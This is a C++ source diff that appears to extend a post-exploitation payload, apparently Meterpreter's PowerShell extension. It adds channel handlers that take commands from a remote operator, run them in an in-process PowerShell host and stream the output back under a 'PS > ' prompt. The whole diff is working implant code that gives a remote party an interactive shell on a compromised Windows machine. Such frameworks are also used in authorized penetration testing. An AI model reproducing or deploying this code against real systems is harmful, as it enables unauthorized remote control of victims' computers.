@@ -13,6 +13,12 @@ extern "C" {
 #include <metahost.h>
 #include "powershell_runner.h"
 
+typedef struct _InteractiveShell
+{
+	HANDLE wait_handle;
+	_bstr_t output;
+} InteractiveShell;
+
 #define SAFE_RELEASE(x) if((x) != NULL) { (x)->Release(); x = NULL; }
 
 #import "mscorlib.tlb" raw_interfaces_only				\
@@ -221,6 +227,144 @@ VOID deinitialize_dotnet_host()
 	SAFE_RELEASE(gClrCorRuntimeHost);
 	SAFE_RELEASE(gClrRuntimeInfo);
 	SAFE_RELEASE(gClrMetaHost);
+}
+
+DWORD powershell_channel_interact_notify(Remote *remote, LPVOID entryContext, LPVOID threadContext)
+{
+	Channel *channel = (Channel*)entryContext;
+	InteractiveShell* shell = (InteractiveShell*)threadContext;
+	DWORD byteCount = shell->output.length() + 1;
+
+	if (shell->output.length() > 1)
+	{
+		DWORD result = channel_write(channel, remote, NULL, 0, (PUCHAR)(char*)shell->output, byteCount, NULL);
+		shell->output = "";
+	}
+
+	return ERROR_SUCCESS;
+}
+
+DWORD powershell_channel_interact_destroy(HANDLE waitable, LPVOID entryContext, LPVOID threadContext)
+{
+	dprintf("[PSH SHELL] finalising interaction");
+	InteractiveShell* shell = (InteractiveShell*)threadContext;
+	if (shell->wait_handle)
+	{
+		CloseHandle(shell->wait_handle);
+		shell->wait_handle = NULL;
+	}
+	return ERROR_SUCCESS;
+}
+
+DWORD powershell_channel_interact(Channel *channel, Packet *request, LPVOID context, BOOLEAN interact)
+{
+	DWORD result = ERROR_SUCCESS;
+	InteractiveShell* shell = (InteractiveShell*)context;
+	if (interact)
+	{
+		if (shell->wait_handle == NULL)
+		{
+			dprintf("[PSH SHELL] beginning interaction");
+			shell->wait_handle = CreateEventA(NULL, TRUE, FALSE, NULL);
+
+			result = scheduler_insert_waitable(shell->wait_handle, channel, context,
+				powershell_channel_interact_notify, powershell_channel_interact_destroy);
+
+			SetEvent(shell->wait_handle);
+		}
+		else
+		{
+			dprintf("[PSH SHELL] resuming interaction");
+			result = scheduler_signal_waitable(shell->wait_handle, Resume);
+			SetEvent(shell->wait_handle);
+		}
+	}
+	else
+	{
+		dprintf("[PSH SHELL] pausing interaction");
+		result = scheduler_signal_waitable(shell->wait_handle, Pause);
+	}
+
+	return result;
+}
+
+DWORD powershell_channel_write(Channel* channel, Packet* request, LPVOID context,
+	LPVOID buffer, DWORD bufferSize, LPDWORD bytesWritten)
+{
+	InteractiveShell* shell = (InteractiveShell*)context;
+
+	_bstr_t codeMarshall((char*)buffer);
+	dprintf("[PSH SHELL] executing command: %s", (char*)codeMarshall);
+
+	_bstr_t output;
+
+	DWORD result = InvokePowershellMethod(gClrPowershellType, L"InvokePS", codeMarshall, output);
+	if (result == ERROR_SUCCESS)
+	{
+		shell->output += output + "PS > ";
+		SetEvent(shell->wait_handle);
+	}
+	return result;
+}
+
+DWORD powershell_channel_close(Channel* channel, Packet* request, LPVOID context)
+{
+	dprintf("[PSH SHELL] closing channel");
+	InteractiveShell* shell = (InteractiveShell*)context;
+	if (shell->wait_handle != NULL)
+	{
+		CloseHandle(shell->wait_handle);
+	}
+	free(shell);
+	return ERROR_SUCCESS;
+}
+
+/*!
+ * @brief Start an interactive powershell session.
+ * @param remote Pointer to the \c Remote making the request.
+ * @param packet Pointer to the request \c Packet.
+ * @returns Indication of success or failure.
+ */
+DWORD request_powershell_shell(Remote *remote, Packet *packet)
+{
+	DWORD dwResult = ERROR_SUCCESS;
+	Packet* response = packet_create_response(packet);
+	InteractiveShell* shell = NULL;
+
+	if (response)
+	{
+		do
+		{
+			PoolChannelOps chanOps = { 0 };
+			shell = (InteractiveShell*)calloc(1, sizeof(InteractiveShell));
+
+			if (shell == NULL)
+			{
+				dprintf("[PSH] Failed to allocated memory");
+				dwResult = ERROR_OUTOFMEMORY;
+				break;
+			}
+
+			chanOps.native.context = shell;
+			chanOps.native.close = powershell_channel_close;
+			chanOps.native.write = powershell_channel_write;
+			chanOps.native.interact = powershell_channel_interact;
+			shell->output = "PS > ";
+			Channel* newChannel = channel_create_pool(0, CHANNEL_FLAG_SYNCHRONOUS, &chanOps);
+
+			channel_set_type(newChannel, "psh");
+			packet_add_tlv_uint(response, TLV_TYPE_CHANNEL_ID, channel_get_id(newChannel));
+		} while (0);
+
+		packet_transmit_response(dwResult, remote, response);
+	}
+
+	if (dwResult != ERROR_SUCCESS)
+	{
+		SAFE_FREE(shell);
+	}
+
+	return dwResult;
 }
 
 /*!
